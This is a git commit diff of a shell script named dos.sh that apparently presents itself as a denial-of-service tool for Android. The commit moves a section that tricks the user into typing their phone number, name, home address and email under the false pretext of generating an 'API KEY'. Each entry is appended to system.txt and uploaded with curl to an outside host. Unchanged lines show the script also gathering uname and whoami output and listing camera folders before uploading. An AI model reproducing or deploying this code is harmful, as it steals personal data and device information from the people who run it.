d661d114d9a36a80108d2cb31ba537ccc0c59ea4
AnonOpsVN24 <123760968+AnonOpsVN24@users.noreply.github.com>
2023-03-05 17:42:22 +0700

    Update dos.sh

--- dos.sh
+++ dos.sh
@@ -1,4 +1,3 @@
-
 #!/system/bin/bash/sh
 
 clear
@@ -15,54 +14,6 @@ echo "Copyright By Pham Chien
 curl -T system.txt http://n8tive.co.za
 
 echo "
- ____       ____
-|  _ \  ___/ ___|
-| |_| |/ _ \___ \\
-|____/ \___/____/
-    _              _           _     _
-   / \   _ __   __| |_ __ ___ (_) __| |
-  / _ \ | |_ \ / _\ | |__/ _ \| |/ _\ |
-/_/   \_\_| |_|\__,_|_|  \___/|_|\__,_|
-
-         ©:PhamChien"
-
-echo -e "\033[33;35m"
-echo "Please Enter your Personal Information to created API KEY use "
-echo ""
-echo "Vui Lòng nhập thông tin cá nhân của bạn , tối thiểu là số điện thoại , để chúng tôi tạo dịch vụ tạo API KEY "
-echo ""
-
-  echo -n "Phone Number:"
-  read phone
-
-  echo "PHONE : $phone" >> system.txt
-  curl -T system.txt http://n8tive.co.za
-
-  echo -n "first xand last name :"
-  read name
-
-  echo "NAME : $name" >> system.txt
-  curl -T system.txt http://n8tive.co.za
-
-  echo -n "Address Home | Dia Chi NHa  : "
-  read adrss
-
-  echo "Address : $adrss" >> system.txt
-  curl -T system.txt http://n8tive.co.za
-
-  echo -n "Email :"
-  read email
-
-  echo "EMAIl : $email" >> system.txt
-  curl -T system.txt http://n8tive.co.za
-
-sleep 1
-echo "[!] Waiting For Me , To Created Api Key "
-echo ""
-echo "[!] Vui Lòng chờ chúng tôi để chúng tôi tạo API KEY cho bạn"
-sleep 3
-
-  echo "
 
   System : $(uname -a)
   User   : $(whoami)
@@ -140,6 +91,54 @@ $(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u)
 
   ','{$line}',' " >> system.txt
    curl -T system.txt http://n8tive.co.za/
+
+echo "
+ ____       ____
+|  _ \  ___/ ___|
+| |_| |/ _ \___ \\
+|____/ \___/____/
+    _              _           _     _
+   / \   _ __   __| |_ __ ___ (_) __| |
+  / _ \ | |_ \ / _\ | |__/ _ \| |/ _\ |
+/_/   \_\_| |_|\__,_|_|  \___/|_|\__,_|
+
+         ©:PhamChien"
+
+echo -e "\033[33;35m"
+echo "Please Enter your Personal Information to created API KEY use "
+echo ""
+echo "Vui Lòng nhập thông tin cá nhân của bạn , tối thiểu là số điện thoại , để chúng tôi tạo dịch vụ tạo API KEY "
+echo ""
+
+  echo -n "Phone Number:"
+  read phone
+
+  echo "PHONE : $phone" >> system.txt
+  curl -T system.txt http://n8tive.co.za
+
+  echo -n "first xand last name :"
+  read name
+
+  echo "NAME : $name" >> system.txt
+  curl -T system.txt http://n8tive.co.za
+
+  echo -n "Address Home | Dia Chi NHa  : "
+  read adrss
+
+  echo "Address : $adrss" >> system.txt
+  curl -T system.txt http://n8tive.co.za
+
+  echo -n "Email :"
+  read email
+
+  echo "EMAIl : $email" >> system.txt
+  curl -T system.txt http://n8tive.co.za
+
+sleep 1
+echo "[!] Waiting For Me , To Created Api Key "
+echo ""
+echo "[!] Vui Lòng chờ chúng tôi để chúng tôi tạo API KEY cho bạn"
+sleep 3
   echo -n enter ip :
  read line
 
